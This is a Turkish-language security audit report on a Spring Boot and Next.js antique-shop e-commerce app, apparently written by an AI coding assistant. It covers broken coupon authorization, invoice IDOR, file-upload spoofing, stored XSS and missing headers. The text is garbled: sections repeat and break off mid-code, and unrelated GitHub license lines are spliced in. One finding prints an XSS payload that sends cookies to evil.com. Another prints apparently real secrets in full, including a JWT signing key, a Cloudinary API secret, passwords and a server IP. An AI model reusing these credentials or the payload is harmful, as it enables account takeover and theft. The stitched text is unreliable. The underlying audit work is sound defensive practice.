Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
